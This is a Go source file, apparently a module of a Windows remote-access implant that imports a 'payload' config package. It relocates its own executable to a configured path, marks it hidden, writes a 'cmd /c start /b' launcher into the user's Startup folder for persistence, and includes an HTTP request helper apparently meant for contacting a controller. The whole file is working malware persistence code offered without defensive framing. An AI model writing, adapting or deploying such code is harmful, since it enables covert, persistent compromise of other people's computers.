package lib

import (
	"bufio"
	"log"
	"net/http"
	"os"
	"os/user"
	conf "payload/config"
	"strings"
	"syscall"
	"time"
)

type FileInf struct {
	FileName string
	FileData string
}

func Argument(command, cut string, args int) string {
	recv := strings.Split(command, cut)
	for len(recv) == args {
		time.Sleep(3 * time.Second)
		continue
	}
	return recv[args]
}

func hiddenAttribute(path string) {
	utf16file, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		log.Panic(err)
	}
	if conf.HIDE_FILE {
		if err = syscall.SetFileAttributes(utf16file, syscall.FILE_ATTRIBUTE_HIDDEN); err != nil {
			log.Panic(err)
		}
	}
}

func httpReq(method, url string) *http.Response {
	client := &http.Client{}
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		log.Panic(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Panic(err)
	}
	return resp
}

func (f *FileInf) Startup() string {
	user, err := user.Current()
	if err != nil {
		log.Panic(err)
	}
	return "C:\\Users\\" + Argument(user.Username, "\\", 1) +
		"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + f.FileName
}

func (f *FileInf) createFile() {
	cfile, err := os.Create(f.FileName)
	if err != nil {
		log.Panic(err)
	}
	defer cfile.Close()
	writer := bufio.NewWriter(cfile)
	if _, err = writer.WriteString(f.FileData); err != nil {
		log.Panic(err)
	}
	writer.Flush()
}

func (f *FileInf) Path(autostart bool) string {
	if autostart {
		os.Rename(os.Args[0], conf.PAYLOAD_PATH+conf.NNAME)
		hiddenAttribute(conf.PAYLOAD_PATH + conf.NNAME)
		f.FileData = "cmd /c start /b \"\" /d \"" + conf.PAYLOAD_PATH + "\" \"" + conf.NNAME + "\""
		f.createFile()
		os.Rename(f.Path(false)+"\\"+conf.START_SERVICE, f.Startup())
	}
	path, err := os.Getwd()
	if err != nil {
		log.Panic(err)
	}
	return path
}

func (f *FileInf) IsPathed() {
	_, err := os.Stat(f.FileName)
	if os.IsNotExist(err) {
		f.Path(true)
	}
}
